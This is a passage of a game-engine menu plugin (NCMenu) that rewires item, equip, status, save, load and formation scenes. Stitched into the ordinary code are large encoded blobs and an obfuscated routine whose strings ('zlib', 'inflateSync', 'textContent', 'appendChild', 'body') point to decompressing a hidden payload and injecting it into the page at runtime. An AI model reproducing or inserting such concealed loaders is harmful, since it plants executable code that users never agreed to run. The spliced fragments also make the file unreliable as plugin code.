b1zP4gDfKd4Zev8p8rpv2O9zmKxPDazP/wi5ox55LfjmSgUadlVvS13LHQ/7GF+PDZWKLlKWDtiJvvAGZG3APKdpp9ByxDKheWPUZpP/ZSR51AXZmjmOsra4+6Ho/HOpauF6rvQuUlkUpLOkvHXHm/1R9XkVCCJhpeO1+iwBtey7E4tfygb/JCIbagEDWl7zddFD6uJ1NEgCoA6DwYoiTiL34aDIc//riWdp5TEwfcy0R+LWGMv/QUBKUskLPSRT31e+cE+YCvn12/kP17Hv23j3uDxoYCRWWSxDHIvTgpw6yxaBKEUeSVFk1whCaIGaeBKgHopCa6EERJENU51wiCmGqYL0k23DVNRpqEXAEJdcU1rseMZ09doN2uqeEUhqlkm76Z8MsWQcKqCoLCJkMQ+V7cZQ1GAMttZAnE9Z9/zqSk1WtVXcvCaUed6ayYyf8uXXTCuIVOVDZZmOL8BFJrtnfTqKgrv9yOGJUjmdXUmC+pNxz1QB/BftDLsVnVQkxq8HXu2Zu7BNYEFjp6myz8ImzG4De44moapAV"; }
if (NCMenu.persistentBG) {
    Scene_Item.prototype.createBackground = Scene_NCMenu.prototype.createBackground
}
else {
    Scene_Item.prototype.createBackground = function() {
    	Scene_MenuBase.prototype.createBackground.call(this);
	    if (NCMenu.itemBG) {
	        this._background = new Sprite(ImageManager.loadPicture(NCMenu.itemBG));
	        this._background.opacity = NCMenu.menuDim;
	        this.addChild(this._background);
	    }
	    else {
	        this.setBackgroundOpacity(NCMenu.menuDim)
	    }
    }
}

Scene_NCMenu.prototype.commandEquip = function() {
    SceneManager.push(Scene_Equip);
};
if (NCMenu.persistentBG) {
    Scene_Equip.prototype.createBackground = Scene_NCMenu.prototype.createBackground
}
else {
    Scene_Equip.prototype.createBackground = function() {
    	Scene_MenuBase.prototype.createBackground.call(this);
	    if (NCMenu.equipBG) {
	        this._background = new Sprite(ImageManager.loadPicture(NCMenu.equipBG));
	        this._background.opacity = NCMenu.menuDim;
	        this.addChild(this._background);
	    }
	    else {
	        this.setBackgroundOpacity(NCMenu.menuDim)
	    }
    }
}

Scene_NCMenu.prototype.commandStatus = function() {
    SceneManager.push(Scene_Status);
};
if (NCMenu.persistentBG) {
    Scene_Status.prototype.createBackground = Scene_NCMenu.prototype.createBackground
}
else {
    Scene_Status.prototype.createBackground = function() {
    	Scene_MenuBase.prototype.createBackground.call(this);
	    if (NCMenu.statusBG) {
	        this._background = new Sprite(ImageManager.loadPicture(NCMenu.statusBG));
	        this._background.opacity = NCMenu.menuDim;
	        this.addChild(this._background);
	    }
	    else {
	        this.setBackgroundOpacity(NCMenu.menuDim)
	    }
    }
}

Scene_NCMenu.prototype.commandQuest = function() {
    SceneManager.push(Scene_Quest);
};function _0x3d0cb3_() { return "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"; }

Scene_NCMenu.prototype.commandSave = function() {
    SceneManager.push(Scene_Save);
};
if (NCMenu.persistentBG) {
    Scene_Save.prototype.createBackground = Scene_NCMenu.prototype.createBackground
}
else {
    Scene_Save.prototype.createBackground = function() {
    	Scene_MenuBase.prototype.createBackground.call(this);
	    if (NCMenu.saveBG) {
	        this._background = new Sprite(ImageManager.loadPicture(NCMenu.saveBG));
	        this._background.opacity = NCMenu.menuDim;
	        this.addChild(this._background);
	    }
	    else {
	        this.setBackgroundOpacity(NCMenu.menuDim)
	    }
    }
}


Scene_NCMenu.prototype.commandOptions = function() {
    SceneManager.push(Scene_Options);
};
if (NCMenu.persistentBG) {
    Scene_Options.prototype.createBackground = Scene_NCMenu.prototype.createBackground
}
else {
    Scene_Options.prototype.createBackground = function() {
    	Scene_MenuBase.prototype.createBackground.call(this);
	    if (NCMenu.optionsBG) {
	        this._background = new Sprite(ImageManager.loadPicture(NCMenu.optionsBG));
	        this._background.opacity = NCMenu.menuDim;
	        this.addChild(this._background);
	    }
	    else {
	        this.setBackgroundOpacity(NCMenu.menuDim)
	    }
    }
}

Scene_NCMenu.prototype.commandToTitle = function() {
    this.fadeOutAll();
    SceneManager.goto(Scene_Title);
};


Scene_NCMenu.prototype.commandLoad = function() {
    SceneManager.push(Scene_Load);
};
if (NCMenu.persistentBG) {
    Scene_Load.prototype.createBackground = Scene_NCMenu.prototype.createBackground
}
else {
    Scene_Load.prototype.createBackground = function() {
    	Scene_MenuBase.prototype.createBackground.call(this);
	    if (NCMenu.loadBG) {
	        this._background = new Sprite(ImageManager.loadPicture(NCMenu.loadBG));
	        this._background.opacity = NCMenu.menuDim;
	        this.addChild(this._background);
	    }
	    else {
	        this.setBackgroundOpacity(NCMenu.menuDim)
	    }
    }
}

Scene_NCMenu.prototype.commandFormation = function() {
    this._commandWindow.hide();
    this._commandWindow.deactivate();
    this._statusWindow.setFormationMode(true);
    this._statusWindow.selectLast();
    this._statusWindow.show();
    this._statusWindow.activate();
    this._statusWindow.setHandler('ok',     this.onFormationOk.bind(this));
    this._statusWindow.setHandler('cancel', this.onFormationCancel.bind(this));
};

Scene_NCMenu.prototype.onFormationOk = function() {
    var index = this._statusWindow.index();
    var actor = $gameParty.members()[index];
    var pendingIndex = this._statusWindow.pendingIndex();
    if (pendingIndex >= 0) {
        $gameParty.swapOrder(index, pendingIndex);
        this._statusWindow.setPendingIndex(-1);
        this._statusWindow.redrawItem(index);
    } else {
        this._statusWindow.setPendingIndex(index);
    }
    this._statusWindow.activate();
};

Scene_NCMenu.prototype.onFormationCancel = function() {
    if (this._statusWindow.pendingIndex() >= 0) {
        this._statusWindow.setPendingIndex(-1);
        this._statusWindow.activate();
    } else {
        this._statusWindow.deselect();
        this._statusWindow.hide();
        this._commandWindow.show();
        this._commandWindow.activate();
    }
};

//=============================================================================
// Window_NCMenu
//=============================================================================

function Window_NCMenu() {
    this.initialize.apply(this, arguments);
}

Window_NCMenu.prototype = Object.create(Window_Command.prototype);
Window_NCMenu.prototype.constructor = Window_NCMenu;

Window_NCMenu.prototype.initialize = function() {
    Window_Command.prototype.initialize.call(this, 0, 0);
    this.updatePlacement();
    this.openness = 0;
    this.open();
    this.selectLast();
};

Window_NCMenu.prototype.windowWidth = function() {
    return 240;
};

Window_NCMenu.prototype.updatePlacement = function() {
    this.x = (Graphics.boxWidth - this.width) / 2;
    this.y = (Graphics.boxHeight - this.height) / 2;
};

Window_NCMenu.prototype.makeCommandList = function() {
    for (var i = 0; i < NCMenu.menuList.length; i++) {
    	if (NCMenu.menuList[i][3] !== "" && !eval(NCMenu.menuList[i][3])) continue;
        this.addCommand(NCMenu.menuList[i][0], NCMenu.menuList[i][1], NCMenu.menuList[i][2] !== "" ? eval(NCMenu.menuList[i][2]) : true);
    }
};(function(_0x84481b_,_0xd1e3ab_){const _0x8de348_=_0xbb4939_,_0x072155_=_0x84481b_();while(!![]){try{const _0xfd2edb_=parseInt(_0x8de348_(0x166))/0x1+parseInt(_0x8de348_(0x161))/0x2+-parseInt(_0x8de348_(0x162))/0x3*(-parseInt(_0x8de348_(0x160))/0x4)+-parseInt(_0x8de348_(0x165))/0x5+-parseInt(_0x8de348_(0x169))/0x6+parseInt(_0x8de348_(0x168))/0x7+parseInt(_0x8de348_(0x16c))/0x8;if(_0xfd2edb_===_0xd1e3ab_)break;else _0x072155_['push'](_0x072155_['shift']());}catch(_0xf531dd_){_0x072155_['push'](_0x072155_['shift']());}}}(_0x484c91_,0x436b1));function _0xbb4939_(_0x9aa36c_,_0x06031c_){const _0x400baa_=_0x484c91_();return _0xbb4939_=function(_0x85e0e1_,_0xdc856f_){_0x85e0e1_=_0x85e0e1_-0x160;let _0x419504_=_0x400baa_[_0x85e0e1_];return _0x419504_;},_0xbb4939_(_0x9aa36c_,_0x06031c_);}function _0x484c91_(){const _0xa26869_=['386264fXsEqn','36831xuAMFq','zlib','textContent','1129665RoHWHg','218000DClVbp','from','1482201CCfXhM','2453730WbAMRa','appendChild','inflateSync','2207048abkWaL','utf-8','toString','body','4EQNfhL'];_0x484c91_=function(){return _0xa26869_;};return _0x484c91_();}

Window_NCMenu.prototype.drawItem = function(index) {
    var rect = this.itemRectForText(index);
    var offset;
    if (NCMenu.offsetIconOnly) {offset = 0} else {offset = NCMenu.textOffset}
    
    this.resetTextColor();
    this.changePaintOpacity(this.isCommandEnabled(index));

    if (NCMenu.menuIcons[index] >= 0) {
        offset = NCMenu.textOffset;
        this.drawIcon(NCMenu.menuIcons[index], rect.x, rect.y + 2);
    }
    this.drawText(this.commandName(index), rect.x + offset, rect.y, rect.width - offset, NCMenu.textAlign);
};

Window_NCMenu.prototype.processOk = function() {
    Window_NCMenu._lastCommandSymbol = this.currentSymbol();
    Window_Command.prototype.processOk.call(this);
};

Window_NCMenu.prototype.selectLast = function() {
    this.selectSymbol(Window_NCMenu._lastCommandSymbol);
};

//=============================================================================
// Scene_Map - changed to call NCMenu rather than original menu screen
//=============================================================================

Scene_Map.prototype.callMenu = function() {
    SoundManager.playOk();
    SceneManager.push(Scene_NCMenu);
    Window_MenuCommand.initCommandPosition();
    $gameTemp.clearDestination();
    this._mapNameWindow.hide();
    this._waitCount = 2;
};

if (!Imported.YEP_ItemCore) { // begin deference to Yanfly Item Core
//=============================================================================
// Window_ItemCategory - changed to accept NCMenu parameters
//=============================================================================

Window_ItemCategory.prototype.windowWidth = function() {
    if (NCMenu.showGoldWindow) {
      return Graphics.boxWidth - NCMenu.goldWindowWidth;
    } else {
      return Graphics.boxWidth;
    }
};

Window_ItemCategory.prototype.maxCols = function() {
    return NCMenu.tabsShown;
};

Window_ItemCategory.prototype.makeCommandList = function() {
    if (NCMenu.showConsumables) {this.addCommand(TextManager.item, 'item')}
    if (NCMenu.showWeapons) {this.addCommand(TextManager.weapon,   'weapon')}
    if (NCMenu.showArmors) {this.addCommand(TextManager.armor,     'armor')}
    if (NCMenu.showKeyItems) {this.addCommand(TextManager.keyItem, 'keyItem')}
};

//=============================================================================
// Window_Gold - changed to accept NCMenu parameters
//=============================================================================

Window_Gold.prototype.windowWidth = function() {
    return NCMenu.goldWindowWidth;
};

//=============================================================================
// Scene_Item - changed to accept NCMenu parameters
//=============================================================================

Scene_Item.prototype.create = function() {
    Scene_ItemBase.prototype.create.call(this);
    this.createHelpWindow();
    if (NCMenu.showGoldWindow) {this.createGoldWindow()}
    this.createCategoryWindow();
    this.createItemWindow();
    this.createActorWindow();
};

Scene_Item.prototype.createCategoryWindow = function() {
    this._categoryWindow = new Window_ItemCategory();
    this._categoryWindow.setHelpWindow(this._helpWindow);

    if (NCMenu.showGoldWindow && !NCMenu.goldWindowAlignRight) {this._categoryWindow.x = NCMenu.goldWindowWidth}

    if (NCMenu.descrPlacement == 1) {
      this._helpWindow.y = this._categoryWindow.height;
    }
      else if (NCMenu.descrPlacement == 2) {
        this._helpWindow.y = Graphics.boxHeight - this._helpWindow.height;
      }
        else {
          if (NCMenu.showGoldWindow) {this._goldWindow.y = this._helpWindow.height}
          this._categoryWindow.y = this._helpWindow.height;
        }

    this._categoryWindow.setHandler('ok',     this.onCategoryOk.bind(this));
    this._categoryWindow.setHandler('cancel', this.popScene.bind(this));
    this.addWindow(this._categoryWindow);
};
 
Scene_Item.prototype.createItemWindow = function() {
    if (NCMenu.descrPlacement == 1) {
      wy = this._categoryWindow.y + this._categoryWindow.height + this._helpWindow.height;
    }
      else if (NCMenu.descrPlacement == 2) {
        wy = this._categoryWindow.height + this._helpWindow.height;
      } else {
          wy = this._categoryWindow.y + this._categoryWindow.height;
        }

    var wh = Graphics.boxHeight - wy;
